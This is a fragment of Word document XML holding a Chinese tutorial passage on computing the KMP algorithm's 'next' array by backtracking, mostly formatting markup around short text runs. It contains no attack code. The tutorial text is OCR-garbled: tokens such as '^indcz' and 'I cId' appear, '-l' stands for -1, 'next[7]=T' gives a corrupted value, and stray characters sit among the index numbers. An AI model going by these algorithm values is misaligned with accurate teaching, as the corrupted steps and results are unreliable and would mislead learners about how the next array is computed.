                <wp:effectExtent l="0" t="0" r="0" b="0"/>
                <wp:wrapSquare wrapText="right"/>
                <wp:docPr id="27" name="Shape 27"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="533400" cy="466725"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:numPr>
                                <w:ilvl w:val="0"/>
                                <w:numId w:val="5"/>
                              </w:numPr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="165"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:bookmarkStart w:id="327" w:name="bookmark37"/>
                            <w:bookmarkEnd w:id="327"/>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>^indcz</w:t>
                            </w:r>
                          </w:p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:numPr>
                                <w:ilvl w:val="0"/>
                                <w:numId w:val="5"/>
                              </w:numPr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="285"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:bookmarkStart w:id="328" w:name="bookmark38"/>
                            <w:bookmarkEnd w:id="328"/>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>str：</w:t>
                            </w:r>
                          </w:p>
                          <w:p>
                            <w:pPr>
                              <w:pStyle w:val="11"/>
                              <w:keepNext w:val="0"/>
                              <w:keepLines w:val="0"/>
                              <w:widowControl w:val="0"/>
                              <w:numPr>
                                <w:ilvl w:val="0"/>
                                <w:numId w:val="5"/>
                              </w:numPr>
                              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                              <w:tabs>
                                <w:tab w:val="left" w:pos="195"/>
                              </w:tabs>
                              <w:bidi w:val="0"/>
                              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                              <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                              <w:jc w:val="left"/>
                            </w:pPr>
                            <w:bookmarkStart w:id="329" w:name="bookmark39"/>
                            <w:bookmarkEnd w:id="329"/>
                            <w:r>
                              <w:rPr>
                                <w:color w:val="000000"/>
                                <w:spacing w:val="0"/>
                                <w:w w:val="100"/>
                                <w:position w:val="0"/>
                                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                              </w:rPr>
                              <w:t>_next</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>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27" o:spid="_x0000_s1026" o:spt="202" type="#_x0000_t202" style="position:absolute;left:0pt;margin-left:120.4pt;margin-top:1pt;height:36.75pt;width:42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4Yer+9cAAAAIAQAADwAA&#10;AAAAAAABACAAAAAiAAAAZHJzL2Rvd25yZXYueG1sUEsBAhQAFAAAAAgAh07iQLbPsSalAQAAZQMA&#10;AA4AAAAAAAAAAQAgAAAAJgEAAGRycy9lMm9Eb2MueG1sUEsFBgAAAAAGAAYAWQEAAD0FAAAAAA==&#10;">
                <v:fill on="f" focussize="0,0"/>
                <v:stroke on="f"/>
                <v:imagedata o:title=""/>
                <o:lock v:ext="edit" aspectratio="f"/>
                <v:textbox inset="0mm,0mm,0mm,0mm">
                  <w:txbxContent>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:numPr>
                          <w:ilvl w:val="0"/>
                          <w:numId w:val="5"/>
                        </w:numPr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:tabs>
                          <w:tab w:val="left" w:pos="165"/>
                        </w:tabs>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:bookmarkStart w:id="327" w:name="bookmark37"/>
                      <w:bookmarkEnd w:id="327"/>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>^indcz</w:t>
                      </w:r>
                    </w:p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:numPr>
                          <w:ilvl w:val="0"/>
                          <w:numId w:val="5"/>
                        </w:numPr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:tabs>
                          <w:tab w:val="left" w:pos="285"/>
                        </w:tabs>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:bookmarkStart w:id="328" w:name="bookmark38"/>
                      <w:bookmarkEnd w:id="328"/>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>str：</w:t>
                      </w:r>
                    </w:p>
                    <w:p>
                      <w:pPr>
                        <w:pStyle w:val="11"/>
                        <w:keepNext w:val="0"/>
                        <w:keepLines w:val="0"/>
                        <w:widowControl w:val="0"/>
                        <w:numPr>
                          <w:ilvl w:val="0"/>
                          <w:numId w:val="5"/>
                        </w:numPr>
                        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
                        <w:tabs>
                          <w:tab w:val="left" w:pos="195"/>
                        </w:tabs>
                        <w:bidi w:val="0"/>
                        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
                        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
                        <w:jc w:val="left"/>
                      </w:pPr>
                      <w:bookmarkStart w:id="329" w:name="bookmark39"/>
                      <w:bookmarkEnd w:id="329"/>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>_next</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t>:</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square" side="right"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText xml:space="preserve"> TOC \o "1-5" \h \z </w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>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2 3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>4 5 6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="23"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="right" w:pos="1673"/>
          <w:tab w:val="right" w:pos="2108"/>
          <w:tab w:val="right" w:pos="2505"/>
          <w:tab w:val="right" w:pos="2820"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="360"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>b a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">b </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="324150"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="23"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="968"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-1 -1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">0 1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>匚</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>H 3 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="23"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="right" w:pos="3385"/>
          <w:tab w:val="right" w:pos="3820"/>
          <w:tab w:val="right" w:pos="4180"/>
          <w:tab w:val="right" w:pos="4465"/>
          <w:tab w:val="right" w:pos="4900"/>
          <w:tab w:val="right" w:pos="5290"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2020" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>str</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>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 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e</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="23"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="right" w:pos="960"/>
          <w:tab w:val="right" w:pos="1320"/>
          <w:tab w:val="right" w:pos="1673"/>
          <w:tab w:val="right" w:pos="2108"/>
          <w:tab w:val="right" w:pos="2505"/>
          <w:tab w:val="right" w:pos="2820"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="80" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>str :a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a</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>所以</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>先回溯到2,再比较下一个字符是否相同，这里是比较</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>b,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>不同，再回溯， 这次前面剩下</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>aba</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>三个字符，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>k=next[2]=0,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>即前后缀还有一个字符相同，所以应该后移到 下图位置。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="2"/>
          <w:szCs w:val="2"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300">
            <wp:extent cx="4324350" cy="952500"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="29" name="Picutre 29"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="29" name="Picutre 29"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId32"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4324350" cy="952500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:after="239" w:line="1" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="345" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>再比较</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>b,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>还不同，再回溯,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>k=next[0]=-l,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>然后</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>next[7]=T,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">这样就求出了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">next </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数组了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1120" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>I cId</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Ie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
